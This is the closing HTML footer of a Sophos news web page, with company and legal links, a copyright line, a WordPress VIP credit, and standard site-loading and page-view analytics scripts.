					<li><a href="https://www.youtube.com/user/SophosProducts" target="_blank"><img src="https://www.sophos.com/en-us/medialibrary/SophosNext/Images/Navigation/Footer/youtube-icon.svg?la=en&amp;hash=CCCF647AFA78C8DB74D654DB9FEFBF0AC54F42D3" alt="YouTube"></a></li>
				</ul>
			</div>
			<ul class="links">
				<li><a href="https://www.sophos.com/en-us/company/careers.aspx">Careers </a></li>
				<li><a href="https://www.sophos.com/en-us/partners/partner-locator.aspx">Find a Partner</a></li>
				<li><a href="https://secure2.sophos.com/en-us/support.aspx">Support</a></li>
				<li><a href="https://www.sophos.com/en-us/threat-center/technical-papers.aspx">Technical Papers</a></li>
				<li><a href="https://www.sophos.com/en-us/security-news-trends/whitepapers.aspx">Whitepapers</a></li>
			</ul>
		</section>
		<section class="legal">
			<div class="copyright">&copy; 1997 - 2021 Sophos Ltd. All rights reserved</div>
			<ul>
				<li><a href="https://www.sophos.com/en-us/legal.aspx">Legal</a></li>
				<li><a href="https://www.sophos.com/en-us/legal/sophos-group-privacy-policy.aspx">Privacy</a></li>
				<li><a href="https://www.sophos.com/en-us/legal/cookie-information.aspx">Cookie Information</a></li>
				<li><a href="https://www.sophos.com/en-us/legal/modern-slavery-act-transparency-statement.aspx">Modern Slavery Statement</a></li>
			</ul>
		</section>
		<div class="vip" style="background: #002939">
			Powered by <a href="https://wpvip.com/?utm_source=vip_powered_wpcom&#038;utm_medium=web&#038;utm_campaign=VIP%20Footer%20Credit&#038;utm_term=news.sophos.com" rel="generator nofollow" class="powered-by-wpcom">WordPress VIP</a>		</div>
	</footer>
	<script id='sophos-js-core-js-extra'>
var PG8Data = {"startPage":"1","maxPages":"1","nextLink":""};
</script>
<script type='text/javascript' src='https://news.sophos.com/_static/??-eJyVkMEOwiAMhl9IYCw648H4KAZZ3ZgUCAWnby9mWeLBw0h66d/va5OKOTDtXQKXRBoBgQT5MHpyMBNrG3kUE5UqkH8YYM+Wt1yWgC8Bn2gnNu3QPlbQ8EpR0XZ+iXhOxtZbWmFQZnDVYlAxOYjV3qCqlW+2SsZpm3ug5a2IZQGLEOybo3H/oNIC3qD/na+XMbNg82AcCfUwhJDEtbji7iMW9oJn2cnDvmuaUzN9AG09yg4='></script>
<script src='https://stats.wp.com/e-202112.js' defer></script>
<script>
	_stq = window._stq || [];
	_stq.push([ 'view', {v:'ext',j:'1:9.5.2',blog:'166161023',post:'66749',tz:'-4',srv:'news.sophos.com'} ]);
	_stq.push([ 'clickTrackerInit', '166161023', '66749' ]);
</script>
</body>
</html>
